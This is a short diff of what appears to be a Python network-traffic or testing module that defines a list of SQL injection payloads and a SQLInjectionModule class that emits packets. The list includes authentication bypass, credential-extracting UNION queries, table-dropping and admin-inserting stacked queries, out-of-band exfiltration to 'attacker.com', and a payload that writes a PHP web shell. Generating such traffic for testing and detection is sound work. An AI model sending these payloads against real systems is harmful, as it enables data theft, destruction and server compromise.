@@ -16,38 +16,31 @@ SQL_INJECTION_PAYLOADS = [
     "admin'--",
     "' OR 1=1--",
     "' OR 'x'='x",
-
     # Union-based injection
     "' UNION SELECT NULL--",
     "' UNION SELECT NULL, NULL--",
     "' UNION SELECT username, password FROM users--",
     "1' UNION SELECT ALL FROM information_schema.tables--",
-
     # Error-based injection
     "' AND 1=CONVERT(int, @@version)--",
     "' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION()))--",
     "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
-
     # Time-based blind injection
     "'; WAITFOR DELAY '0:0:5'--",
     "'; SELECT SLEEP(5)--",
     "' AND SLEEP(5)--",
     "1' AND (SELECT 1 FROM (SELECT SLEEP(5))A)--",
-
     # Stacked queries
     "'; DROP TABLE users--",
     "'; INSERT INTO admin VALUES('hacker','password')--",
     "'; UPDATE users SET password='hacked' WHERE username='admin'--",
-
     # Out-of-band injection
     "'; EXEC master..xp_cmdshell 'ping attacker.com'--",
     "' AND LOAD_FILE(CONCAT('\\\\\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\\\a'))--",
-
     # NoSQL injection patterns
     "{'$gt': ''}",
     "{'$ne': null}",
     "admin'; return true; var dummy='",
-
     # Second-order injection
     "' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/shell.php'--",
 ]
@@ -134,5 +127,3 @@ class SQLInjectionModule(TrafficModule):
         )
 
         yield packet
-
-
